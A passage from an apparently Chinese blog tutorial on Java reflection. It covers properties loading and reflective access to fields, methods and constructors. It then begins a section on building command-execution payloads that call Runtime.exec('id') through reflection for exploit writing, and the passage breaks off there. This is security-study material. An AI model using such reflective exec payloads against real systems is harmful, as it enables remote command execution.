采用以上的代码可以拿到一个文件的绝对路径。</span></span><br><span class="line">        <span class="comment">// /D:/996-CodeSection/001-IDEA/0.JavaSE/TestProject/out/production/practice/reflectClassInfo2.properties</span></span><br><span class="line">        System.out.println(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path2</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;javase/reflectBean/db.properties&quot;</span>).getPath();</span><br><span class="line">        <span class="comment">// /D:/996-CodeSection/001-IDEA/0.JavaSE/TestProject/out/production/practice/javase/reflectBean/db.properties</span></span><br><span class="line">        System.out.println(path2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IoPropertiesTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//以前</span></span><br><span class="line">        <span class="comment">/*String path = Thread.currentThread().getContextClassLoader().getResource(&quot;reflectClassInfo2.properties&quot;).getPath();</span></span><br><span class="line"><span class="comment">        FileReader reader = new FileReader(path);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//现在</span></span><br><span class="line">        <span class="comment">// 直接以流的形式返回。</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">reader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResourceAsStream(<span class="string">&quot;reflectClassInfo2.properties&quot;</span>);</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        pro.load(reader);</span><br><span class="line">        reader.close();</span><br><span class="line">        <span class="comment">// 通过key获取value</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        System.out.println(className);<span class="comment">// java.util.Date</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">java.util包下提供了一个资源绑定器，便于获取属性配置文件中的内容。</span></span><br><span class="line"><span class="comment">使用以下这种方式的时候，属性配置文件xxx.properties必须放到类路径下。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ResourceBundleTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 资源绑定器，只能绑定xxx.properties文件。并且这个文件必须在类路径下。文件扩展名也必须是properties</span></span><br><span class="line">        <span class="comment">// 并且在写路径的时候，路径后面的扩展名不能写。</span></span><br><span class="line"><span class="comment">//        ResourceBundle bundle = ResourceBundle.getBundle(&quot;reflectClassInfo2&quot;);</span></span><br><span class="line">        <span class="type">ResourceBundle</span> <span class="variable">bundle</span> <span class="operator">=</span> ResourceBundle.getBundle(<span class="string">&quot;javase/reflectBean/db&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> bundle.getString(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        System.out.println(className);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">反射Student类当中所有的Field（了解一下）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest05</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> studentClass.getName();<span class="comment">// Class类的getName方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;完整类名： &quot;</span> + className);</span><br><span class="line">        <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> studentClass.getSimpleName();<span class="comment">// Class类的getName方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;简类名： &quot;</span> + simpleName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取public修饰的属性</span></span><br><span class="line">        Field[] fields1 = studentClass.getFields();</span><br><span class="line">        System.out.println(fields1.length);<span class="comment">// 2</span></span><br><span class="line">        System.out.println(fields1[<span class="number">0</span>].getName() + <span class="string">&quot; &quot;</span> + fields1[<span class="number">1</span>].getName()); <span class="comment">//Field类中的getName犯法</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的属性</span></span><br><span class="line">        Field[] fields2 = studentClass.getDeclaredFields();</span><br><span class="line">        System.out.println(fields2.length);</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields2)&#123;</span><br><span class="line">            System.out.println(f.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取属性的修饰符列表</span></span><br><span class="line">        <span class="keyword">for</span> (Field f : fields2)&#123;</span><br><span class="line">            <span class="comment">// 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号</span></span><br><span class="line">            <span class="comment">// 用Modifier类的toString转换成字符串</span></span><br><span class="line">            System.out.println(Modifier.toString(f.getModifiers()));</span><br><span class="line">            System.out.println(f.getType().getSimpleName());<span class="comment">// 获取属性的类型</span></span><br><span class="line">            System.out.println(f.getName());<span class="comment">// 获取属性的名字</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射机制，反编译一个类的属性Field（了解一下）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest06</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        s.append(Modifier.toString(studentClass.getModifiers()) + <span class="string">&quot; class &quot;</span> + studentClass.getSimpleName() + <span class="string">&quot; &#123;\n&quot;</span>);<span class="comment">// Class类的getName方法</span></span><br><span class="line">        <span class="comment">//获取所有的属性</span></span><br><span class="line">        Field[] fields = studentClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号</span></span><br><span class="line">            <span class="comment">// 用Modifier类的toString转换成字符串</span></span><br><span class="line">            s.append(Modifier.toString(f.getModifiers()));</span><br><span class="line">            <span class="keyword">if</span> (f.getModifiers() != <span class="number">0</span>) s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getType().getSimpleName());<span class="comment">// 获取属性的类型</span></span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getName());<span class="comment">// 获取属性的名字</span></span><br><span class="line">            s.append(<span class="string">&quot;;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">必须掌握：</span></span><br><span class="line"><span class="comment">    怎么通过反射机制访问一个java对象的属性？</span></span><br><span class="line"><span class="comment">        给属性赋值set</span></span><br><span class="line"><span class="comment">        获取属性的值get</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest07</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//不使用反射机制给属性赋值</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">/**给属性赋值三要素：给s对象的no属性赋值1111</span></span><br><span class="line"><span class="comment">         * 要素1：对象s</span></span><br><span class="line"><span class="comment">         * 要素2：no属性</span></span><br><span class="line"><span class="comment">         * 要素3：1111</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        student.no = <span class="number">1111</span>;</span><br><span class="line">        <span class="comment">/**读属性值两个要素：获取s对象的no属性的值。</span></span><br><span class="line"><span class="comment">         * 要素1：对象s</span></span><br><span class="line"><span class="comment">         * 要素2：no属性</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(student.no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制给属性赋值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> studentClass.newInstance();<span class="comment">// obj就是Student对象。（底层调用无参数构造方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取no属性（根据属性的名称来获取Field）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">noField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        <span class="comment">// 给obj对象(Student对象)的no属性赋值</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            虽然使用了反射机制，但是三要素还是缺一不可：</span></span><br><span class="line"><span class="comment">                要素1：obj对象</span></span><br><span class="line"><span class="comment">                要素2：no属性</span></span><br><span class="line"><span class="comment">                要素3：22222值</span></span><br><span class="line"><span class="comment">            注意：反射机制让代码复杂了，但是为了一个“灵活”，这也是值得的。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        noField.set(obj, <span class="number">22222</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取属性的值</span></span><br><span class="line">        <span class="comment">// 两个要素：获取obj对象的no属性的值。</span></span><br><span class="line">        System.out.println(noField.get(obj));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以访问私有的属性吗？</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// 打破封装（反射机制的缺点：打破封装，可能会给不法分子留下机会！！！）</span></span><br><span class="line">        <span class="comment">// 这样设置完之后，在外部也是可以访问private的。</span></span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 给name属性赋值</span></span><br><span class="line">        nameField.set(obj, <span class="string">&quot;xiaowu&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取name属性的值</span></span><br><span class="line">        System.out.println(nameField.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">作为了解内容（不需要掌握）：</span></span><br><span class="line"><span class="comment">    反射Method</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest08</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有的Method（包括私有的！）</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            <span class="comment">// 获取修饰符列表</span></span><br><span class="line">            System.out.println(Modifier.toString(m.getModifiers()));</span><br><span class="line">            <span class="comment">// 获取方法的返回值类型</span></span><br><span class="line">            System.out.println(m.getReturnType().getSimpleName());</span><br><span class="line">            <span class="comment">// 获取方法名</span></span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">            <span class="comment">// 方法的修饰符列表（一个方法的参数可能会有多个。）</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (Class pts : parameterTypes)&#123;</span><br><span class="line">                System.out.println(pts.getSimpleName());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">了解一下，不需要掌握（反编译一个类的方法。）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest09</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s.append(Modifier.toString(userServiceClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(userServiceClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot; &#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有的Method（包括私有的！）</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取修饰符列表</span></span><br><span class="line">            s.append(Modifier.toString(m.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// 获取方法的返回值类型</span></span><br><span class="line">            s.append(m.getReturnType().getSimpleName());</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// 获取方法名</span></span><br><span class="line">            s.append(m.getName());</span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="comment">// 方法的修饰符列表（一个方法的参数可能会有多个。）</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span>) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;) &#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重点：必须掌握，通过反射机制怎么调用一个对象的方法？</span></span><br><span class="line"><span class="comment">    五颗星*****</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    反射机制，让代码很具有通用性，可变化的内容都是写到配置文件当中，</span></span><br><span class="line"><span class="comment">    将来修改配置文件之后，创建的对象不一样了，调用的方法也不同了，</span></span><br><span class="line"><span class="comment">    但是java代码不需要做任何改动。这就是反射机制的魅力。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest10</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 不使用反射机制，怎么调用方法</span></span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>();</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            要素分析：</span></span><br><span class="line"><span class="comment">                要素1：对象userService</span></span><br><span class="line"><span class="comment">                要素2：login方法名</span></span><br><span class="line"><span class="comment">                要素3：实参列表</span></span><br><span class="line"><span class="comment">                要素4：返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(userService.login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>) ? <span class="string">&quot;登入成功！&quot;</span> : <span class="string">&quot;登入失败！&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制调用方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> userServiceClass.newInstance();</span><br><span class="line">        <span class="comment">// 获取Method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">loginMethod</span> <span class="operator">=</span> userServiceClass.getDeclaredMethod(<span class="string">&quot;login&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="comment">//        Method loginMethod = userServiceClass.getDeclaredMethod(&quot;login&quot;);//注：没有形参就不传</span></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="comment">// 调用方法有几个要素？ 也需要4要素。</span></span><br><span class="line">        <span class="comment">// 反射机制中最最最最最重要的一个方法，必须记住。</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            四要素：</span></span><br><span class="line"><span class="comment">            loginMethod方法</span></span><br><span class="line"><span class="comment">            obj对象</span></span><br><span class="line"><span class="comment">            &quot;admin&quot;,&quot;123&quot; 实参</span></span><br><span class="line"><span class="comment">            retValue 返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">resValues</span> <span class="operator">=</span> loginMethod.invoke(obj, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>);<span class="comment">//注：方法返回值是void 结果是null</span></span><br><span class="line">        System.out.println(resValues);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">反编译一个类的Constructor构造方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest11</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public class UserService &#123;</span></span><br><span class="line">        s.append(Modifier.toString(vipClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(vipClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot;&#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = vipClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : constructors)&#123;</span><br><span class="line">            <span class="comment">//public Vip(int no, String name, String birth, boolean sex) &#123;</span></span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            s.append(Modifier.toString(c.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="comment">//            s.append(c.getName());//包名+类名</span></span><br><span class="line">            s.append(vipClass.getSimpleName());<span class="comment">//类名</span></span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            Class[] parameterTypes = c.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span> ) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;)&#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">比上一个例子(ReflectTest11)重要一些！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通过反射机制调用构造方法实例化java对象。（这个不是重点）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest12</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//不适用反射创建对象</span></span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>();</span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>(<span class="number">123</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;2001-10-19&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制创建对象（以前）</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用无参数构造方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> vipClass.newInstance();<span class="comment">//Class类的newInstance方法</span></span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制创建对象（现在）</span></span><br><span class="line">        <span class="comment">// 调用有参数的构造方法怎么办？</span></span><br><span class="line">        <span class="comment">// 第一步：先获取到这个有参数的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c1</span> <span class="operator">=</span> vipClass.getDeclaredConstructor(<span class="type">int</span>.class, String.class, String.class, <span class="type">boolean</span>.class);</span><br><span class="line">        <span class="comment">// 第二步：调用构造方法new对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> c1.newInstance(<span class="number">321</span>, <span class="string">&quot;lsi&quot;</span>, <span class="string">&quot;1999-10-11&quot;</span>, <span class="literal">true</span>);<span class="comment">//Constructor类的newInstance方法</span></span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取无参数构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c2</span> <span class="operator">=</span> vipClass.getDeclaredConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> c2.newInstance();</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重点：给你一个类，怎么获取这个类的父类，已经实现了哪些接口？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest13</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// String举例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取String的父类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">superclass</span> <span class="operator">=</span> vipClass.getSuperclass();</span><br><span class="line">        <span class="comment">// 获取String类实现的所有接口（一个类可以实现多个接口。）</span></span><br><span class="line">        Class[] interfaces = vipClass.getInterfaces();</span><br><span class="line">        System.out.println(superclass.getName());</span><br><span class="line">        <span class="keyword">for</span> (Class i : interfaces) &#123;</span><br><span class="line">            System.out.println(i.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p><h2 id="6-nenstance的使用">6.nenstance的使用</h2><p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是：</p><ol><li><p>你使用的类没有无参构造函数</p></li><li><p>你使用的类构造函数是私有的 最最最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>报错</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713774552001-2e3407dc-7609-444f-8082-257af26caed2.png" alt=""></p><p>原因是 Runtime 类的构造方法是私有的。 有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 建立连接的代码...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建 立多个数据库连接。 回到正题，Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 